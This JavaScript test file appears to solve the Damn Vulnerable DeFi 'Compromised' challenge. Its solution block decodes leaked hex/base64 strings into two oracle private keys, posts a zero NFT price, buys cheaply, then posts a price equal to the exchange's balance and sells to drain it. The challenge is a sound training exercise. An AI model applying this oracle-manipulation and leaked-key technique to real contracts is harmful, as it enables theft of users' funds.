const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;
    const DVNNFT_STR = 'DVNFT';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                [DVNNFT_STR, DVNNFT_STR, DVNNFT_STR],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const leakedRawData = [
            '4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535',
            '4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134'
        ];

        // Base64 (https://en.wikipedia.org/wiki/Base64) commonly used online to encode binary
        // data as a string. Two (hex) numbers are used to represent one byte hence spacing
        // in the leaked data which I've removed. To get the private keys:
        //
        // 1) interpret the raw data as hex & convert to string
        // 2) interpret the first decoded string as base64 & convert to string

        function convertRawToPrivateKey(raw) {
            const decodedHexStr = Buffer.from(raw, 'hex').toString('utf8');
            const decodedB64Str = Buffer.from(decodedHexStr, 'base64').toString('utf8');

            return decodedB64Str;
        };

        const privateKey0 = convertRawToPrivateKey(leakedRawData[0]);
        const privateKey1 = convertRawToPrivateKey(leakedRawData[1]);

        // get two new signers from ethersjs for these keys
        const signer0 = new ethers.Wallet(privateKey0, ethers.provider);
        const signer1 = new ethers.Wallet(privateKey1, ethers.provider);

        // @audit Exchange depends upon oracle prices, we must compromise
        // the oracle prices to buy nft low & sell high. Attack:
        //
        // 1) Call TrustfulOracle.postPrice() from compromised oracles
        // to set zero price
        //
        // 2) Buy NFT via Exchange.buyOne()
        //
        // 3) Call TrustfulOracle.postPrice() with EXCHANGE_INITIAL_ETH_BALANCE
        // to set price at exchange funds
        //
        // 4) Sell NFT via Exchange.sellOne() to drain exchange
        await oracle.connect(signer0).postPrice(DVNNFT_STR, 0);
        await oracle.connect(signer1).postPrice(DVNNFT_STR, 0);

        await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.000000001")});

        await oracle.connect(signer0).postPrice(DVNNFT_STR, EXCHANGE_INITIAL_ETH_BALANCE);
        await oracle.connect(signer1).postPrice(DVNNFT_STR, EXCHANGE_INITIAL_ETH_BALANCE);

        // need to approve exchange to sell our NFT
        await nftToken.connect(player).approve(exchange.address, 0);
        await exchange.connect(player).sellOne(0);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice(DVNNFT_STR)
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
